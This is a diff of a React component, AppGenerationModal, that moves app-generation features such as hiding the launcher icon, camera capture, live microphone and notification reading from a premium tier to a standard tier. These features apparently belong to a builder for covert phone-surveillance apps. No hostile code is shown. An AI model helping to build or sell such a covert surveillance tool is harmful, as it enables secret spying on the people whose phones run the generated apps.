@@ -15,7 +15,7 @@ interface AppGenerationModalProps {
     onClose: () => void;
     uuid: string;
     socket: any;
-    userPlan?: 'basic' | 'standard' | 'premium';
+    userPlan?: 'basic' | 'standard';
     onUpgrade?: () => void;
 }
 
@@ -147,7 +147,7 @@ function generatePresetIconBlob(presetId: string): Promise<Blob | null> {
 
 export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
     const isBasicPlan = userPlan === 'basic';
-    const isPremium = userPlan === 'premium';
+    const isStandard = userPlan === 'standard' || (userPlan as string) === 'premium';
 
     const [activeStep, setActiveStep] = useState<'identity' | 'permissions' | 'notifications'>('identity');
     const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
@@ -815,7 +815,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 <span className="text-xs font-bold text-fg-2">Hide Launcher Icon</span>
                                                 {isBasicPlan && (
                                                     <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded text-[9px] font-extrabold tracking-wider">
-                                                        PRO
+                                                        STANDARD
                                                     </span>
                                                 )}
                                             </div>
@@ -880,9 +880,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
                                             <span className="text-sm font-bold text-cyan-200">Camera Capture</span>
-                                            {!isPremium && (
+                                            {isBasicPlan && (
                                                 <span className="bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
-                                                    PREMIUM
+                                                    STANDARD
                                                 </span>
                                             )}
                                             <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-cyan-400/70 hover:text-cyan-300">
@@ -894,12 +894,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <button
                                         type="button"
                                         onClick={() => {
-                                            if (!isPremium) { onUpgrade?.(); return; }
+                                            if (isBasicPlan) { onUpgrade?.(); return; }
                                             setEnableCameraPermission(!enableCameraPermission);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
+                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
                                     >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && isPremium ? 'left-6' : 'left-1'}`} />
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && isStandard ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
@@ -908,9 +908,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
                                             <span className="text-sm font-bold text-purple-200">Live Microphone</span>
-                                            {!isPremium && (
+                                            {isBasicPlan && (
                                                 <span className="bg-purple-500/20 text-purple-300 border border-purple-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
-                                                    PREMIUM
+                                                    STANDARD
                                                 </span>
                                             )}
                                             <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-purple-400/70 hover:text-purple-300">
@@ -922,12 +922,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <button
                                         type="button"
                                         onClick={() => {
-                                            if (!isPremium) { onUpgrade?.(); return; }
+                                            if (isBasicPlan) { onUpgrade?.(); return; }
                                             setEnableMicrophonePermission(!enableMicrophonePermission);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
+                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
                                     >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isPremium ? 'left-6' : 'left-1'}`} />
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isStandard ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
@@ -936,6 +936,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
                                             <span className="text-sm font-bold text-sky-200">Notification Reader</span>
+                                            {isBasicPlan && (
+                                                <span className="bg-sky-500/20 text-sky-300 border border-sky-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
+                                                    STANDARD
+                                                </span>
+                                            )}
                                             <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-sky-400/70 hover:text-sky-300">
                                                 <Info size={14} />
                                             </button>
@@ -944,10 +949,13 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </div>
                                     <button
                                         type="button"
-                                        onClick={() => setEnableNotificationListener(!enableNotificationListener)}
-                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
+                                        onClick={() => {
+                                            if (isBasicPlan) { onUpgrade?.(); return; }
+                                            setEnableNotificationListener(!enableNotificationListener);
+                                        }}
+                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
                                     >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener ? 'left-6' : 'left-1'}`} />
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && isStandard ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
